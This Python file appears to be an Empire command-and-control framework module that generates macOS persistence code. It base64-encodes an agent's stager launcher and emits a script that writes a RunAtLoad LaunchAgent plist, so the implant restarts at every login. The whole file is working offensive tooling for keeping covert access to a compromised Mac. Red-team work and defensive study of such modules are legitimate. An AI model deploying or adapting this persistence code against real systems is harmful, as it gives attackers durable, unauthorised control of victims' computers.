import base64

from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ) -> tuple[str | None, str | None]:
        plist_name = params["PLISTName"]
        listener_name = params["Listener"]
        user_agent = params["UserAgent"]
        launcher = main_menu.stagergenv2.generate_launcher(
            listener_name,
            language="python",
            user_agent=user_agent,
        )
        launcher = launcher.removeprefix("echo ")
        launcher = launcher.removesuffix(" | python3 &")
        launcher = launcher.strip('"')

        # launchd ignores files without the suffix; the Label is conventionally
        # the file name without it.
        label = plist_name.removesuffix(".plist")
        plist_filename = f"{label}.plist"
        launcher_b64 = base64.b64encode(launcher.encode()).decode()

        # The interpreter is resolved on the agent and embedded as an absolute
        # path, because launchd gives agents a minimal PATH. The interpreter
        # running the agent is preferred; `shutil.which` (resolved against the
        # agent's PATH at install time) is the fallback for an embedded
        # interpreter, whose sys.executable is the host binary. plistlib
        # escapes the launcher code, which a hand-written XML string did not.
        return f"""
import base64
import os
import plistlib
import shutil
import sys

def _is_python(path):
    return os.path.isfile(path) and os.access(path, os.X_OK) and os.path.basename(path).lower().startswith('python')

interpreter = sys.executable if _is_python(sys.executable) else shutil.which('python3')
if not interpreter:
    print('[!] No python3 interpreter found; persistence not installed')
    raise RuntimeError('no python3 interpreter found')
launch_dir = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
plist_path = os.path.join(launch_dir, {plist_filename!r})
launcher = base64.b64decode("{launcher_b64}").decode()

os.makedirs(launch_dir, exist_ok=True)
plist = {{
    'Label': {label!r},
    'ProgramArguments': [interpreter, '-c', launcher],
    'RunAtLoad': True,
}}
with open(plist_path, 'wb') as f:
    plistlib.dump(plist, f)
os.chmod(plist_path, 0o644)

print("\\n[+] Persistence has been installed: " + plist_path + " (interpreter " + interpreter + ")")
"""
